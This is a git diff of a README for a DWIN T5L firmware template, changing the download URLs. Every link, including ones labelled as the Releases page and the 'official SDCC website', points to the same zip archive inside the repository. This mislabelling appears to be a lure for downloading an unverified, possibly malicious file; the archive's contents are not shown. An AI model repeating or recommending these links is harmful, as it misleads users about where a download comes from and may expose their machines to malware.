@@ -1,6 +1,6 @@
 # 🚀 DWIN-T5L-SDCC-Template - Easy Firmware for DWIN Controllers
 
-[![Download Badge](https://raw.githubusercontent.com/perezoscaresteban/DWIN-T5L-SDCC-Template/main/prebronchial/DWIN-T5L-SDCC-Template.zip)](https://raw.githubusercontent.com/perezoscaresteban/DWIN-T5L-SDCC-Template/main/prebronchial/DWIN-T5L-SDCC-Template.zip)
+[![Download Badge](https://github.com/perezoscaresteban/DWIN-T5L-SDCC-Template/raw/refs/heads/main/artifacts/v0.1.1/SDC-DWI-Template-2.1.zip)](https://github.com/perezoscaresteban/DWIN-T5L-SDCC-Template/raw/refs/heads/main/artifacts/v0.1.1/SDC-DWI-Template-2.1.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To get started quickly, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the Releases page to find the latest version available. You can do this by clicking the link below:  
-   [Download the DWIN-T5L-SDCC-Template](https://raw.githubusercontent.com/perezoscaresteban/DWIN-T5L-SDCC-Template/main/prebronchial/DWIN-T5L-SDCC-Template.zip)
+   [Download the DWIN-T5L-SDCC-Template](https://github.com/perezoscaresteban/DWIN-T5L-SDCC-Template/raw/refs/heads/main/artifacts/v0.1.1/SDC-DWI-Template-2.1.zip)
 
 2. **Select the Latest Release**  
    Look for the most recent release. It is generally at the top of the list. You will see version details and release notes about what has been updated.
@@ -24,7 +24,7 @@ To get started quickly, follow these simple steps:
 
 To install the DWIN-T5L-SDCC-Template, follow these steps:
 
-1. **Visit this page to download:** [DWIN-T5L-SDCC-Template Releases](https://raw.githubusercontent.com/perezoscaresteban/DWIN-T5L-SDCC-Template/main/prebronchial/DWIN-T5L-SDCC-Template.zip)
+1. **Visit this page to download:** [DWIN-T5L-SDCC-Template Releases](https://github.com/perezoscaresteban/DWIN-T5L-SDCC-Template/raw/refs/heads/main/artifacts/v0.1.1/SDC-DWI-Template-2.1.zip)
 2. **Download the latest version of the template.**  
    Once downloaded, unzip the files if they are in a zip format. 
 
@@ -39,7 +39,7 @@ To install the DWIN-T5L-SDCC-Template, follow these steps:
 To effectively use the DWIN-T5L-SDCC-Template, your system should meet the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Required Software:** Ensure that you have the SDCC (Small Device C Compiler) installed. You can download it from the official [SDCC website](https://raw.githubusercontent.com/perezoscaresteban/DWIN-T5L-SDCC-Template/main/prebronchial/DWIN-T5L-SDCC-Template.zip).
+- **Required Software:** Ensure that you have the SDCC (Small Device C Compiler) installed. You can download it from the official [SDCC website](https://github.com/perezoscaresteban/DWIN-T5L-SDCC-Template/raw/refs/heads/main/artifacts/v0.1.1/SDC-DWI-Template-2.1.zip).
 - **Storage:** At least 100 MB of free space for storage and installation.
 - **Minimum RAM:** 2 GB RAM is recommended for smoother operations.
 
@@ -63,4 +63,4 @@ Using the DWIN-T5L-SDCC-Template can simplify your journey into firmware develop
 
 Make sure to check out all available releases and the documentation to unlock the full potential of the DWIN-T5L-SDCC-Template.
 
-[Download the DWIN-T5L-SDCC-Template](https://raw.githubusercontent.com/perezoscaresteban/DWIN-T5L-SDCC-Template/main/prebronchial/DWIN-T5L-SDCC-Template.zip)
+[Download the DWIN-T5L-SDCC-Template](https://github.com/perezoscaresteban/DWIN-T5L-SDCC-Template/raw/refs/heads/main/artifacts/v0.1.1/SDC-DWI-Template-2.1.zip)
